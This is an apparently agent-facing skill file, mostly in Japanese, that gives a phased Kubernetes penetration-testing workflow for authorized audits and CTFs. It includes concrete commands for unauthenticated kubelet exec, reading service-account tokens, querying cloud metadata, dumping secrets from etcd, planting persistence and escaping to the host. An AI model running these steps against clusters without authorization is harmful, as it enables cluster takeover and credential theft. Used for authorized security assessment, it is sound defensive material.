---
name: kubernetes-security
description: API server / kubelet / etcd / pod / RBAC / NetworkPolicy / Secrets / manifest を対象に K8s cluster を体系的に評価する。pentest / CIS audit / etcd 設定 / manifest static scan を統合する横断 skill。CTF cloud / HTB Pro Labs / 自社 cluster の攻撃面評価で発火。CIS / etcd / kubesec の深掘りは references/ 参照
category: cloud
tags:
  - kubernetes
  - pentest
  - cis-benchmark
  - etcd
  - manifest-scan
  - rbac
  - kubelet
---

# Kubernetes Security

## When to Use

- 認可済 K8s cluster に対する攻撃面評価
- post-foothold (pod 内に侵入後) の cluster 制圧チェーン評価
- HTB / CTF cloud で K8s が target
- 既存 cluster の compliance audit / etcd 設定 / manifest scan による静的評価

**使わない場面**: cluster API audit log の事後解析 (→ `container-forensics`)、container runtime syscall (→ `cloud-forensics/references/k8s-runtime-falco.md`)、blue team の k8s pod 権限昇格検出 (→ `detection-cloud-anomalies`)。

variant の深掘りは references/ を参照: CIS Kubernetes Benchmark で kube-bench audit = `references/cis-benchmark.md`、etcd の TLS / encryption / backup / network 評価 = `references/etcd.md`、manifest (Helm / kustomize) の kubesec 静的 scan = `references/manifest-scan.md`。

## Approach / Workflow

### Phase 1 — 偵察

外部 (internet) から:

```bash
# kube-hunter
kube-hunter --remote <ip>
kube-hunter --remote-cidr <cidr>

# port scan
nmap -p 6443,8080,10250,10255,2379,2380,30000-32767 <ip>
```

主要 port:

```
6443    apiserver (TLS)
8080    apiserver insecure-port (現代では普通閉じている)
10250   kubelet (TLS)
10255   kubelet read-only (deprecated but seen)
10256   kube-proxy health
2379-80 etcd
NodePort 30000-32767
```

### Phase 2 — anonymous / unauth

```bash
# apiserver anonymous
curl -ks https://<apiserver>:6443/api/v1/namespaces/kube-system/pods
# anonymous-auth=true なら 200 / 一部情報

# kubelet
curl -ks https://<node>:10250/pods       # API
curl -ks https://<node>:10250/runningpods/  # 古い endpoint
curl -ks https://<node>:10250/exec/<ns>/<pod>/<container>?command=id&input=1&output=1&tty=1
```

### Phase 3 — pod 内侵入後 (post-foothold)

pod に shell を取った後の典型 chain:

```
1. ServiceAccount token 確認
   cat /var/run/secrets/kubernetes.io/serviceaccount/token
   curl -k -H "Authorization: Bearer $TOKEN" https://kubernetes.default/api/v1/namespaces

2. 自分の権限確認
   kubectl auth can-i --list

3. cluster 全体への RBAC 確認
   kubectl get clusterrolebinding -o yaml | grep -A5 cluster-admin

4. exec into kube-system pods
   kubectl exec -n kube-system <admin-pod> -- ls /

5. mount host
   create pod with hostPath: / + privileged

6. metadata exfil
   curl http://169.254.169.254/...   (AWS / Azure / GCP)
```

### Phase 4 — 自動化 tool

```
- kube-hunter (passive / active)
- peirates (post-exploit 自動化)
- kubeletctl (kubelet API 直接)
- kubescape (CIS / NSA)
- kdigger (capability / cluster context dump)
```

### Phase 5 — 横展開 (lateral)

```
- 他 namespace の secret 取得 (RBAC に応じる)
- daemon set 作成 (全 node に persistent)
- mutating webhook を仕込む (全新 pod を hijack)
- node port + 外部 ingress で C2
- crd + controller で persistence
```

### Phase 6 — escape

```
- privileged + hostPID + hostPath: / で host root
- /var/run/docker.sock マウントで host docker daemon 操作
- CAP_SYS_ADMIN + nsenter で namespace escape
- kernel exploit (CVE 系)
- container runtime CVE (runc / containerd)
```

詳細: `container-forensics`、`detection-cloud-anomalies`。

### Phase 7 — etcd 直接

etcd 詳細な評価 (TLS / encryption at rest / backup / network isolation) は `references/etcd.md`。短い確認:

```bash
# etcd port が exposed なら
etcdctl --endpoints=https://<etcd>:2379 \
  --cacert=ca.pem --cert=client.pem --key=client-key.pem \
  get / --prefix --keys-only

# secret は etcd 内 raw で平文 (encryption at rest 無しだと)
etcdctl get /registry/secrets/default/<secret>
```

### Phase 8 — レポート

```
- 環境 / cluster version / managed か self
- 検出 finding (severity 別)
- 攻撃 chain (foothold → cluster admin)
- 横展開 / escape 経路
- IOC / 推奨対応
- 修正後 baseline 計画
```

## Tools

```
kubectl / kubeletctl
kube-hunter / peirates / kdigger / kubescape
nmap
WebFetch
Bash (sandbox)
```

## Related Skills

- `cloud-pentester` (cloud 全体の攻撃)
- `container-forensics` (post-incident analysis)
- `cloud-forensics` (cloud 全体の forensics)
- `detection-cloud-anomalies` (defender)
- `bug-bounter`, `web-pentester`, `red-teamer`
- `server-side` (metadata 経路)
- `dfir`, `blue-teamer`

## Rules

1. **明示許可** — production cluster での試験は事前承認 + maintenance window 必須
2. **non-destructive** — pod / daemon set 作成は test namespace、cleanup 必須
3. **secret 取扱** — 取得した token / kubeconfig を report に貼らない
4. **kube-hunter active mode** — production への active scan は要承認
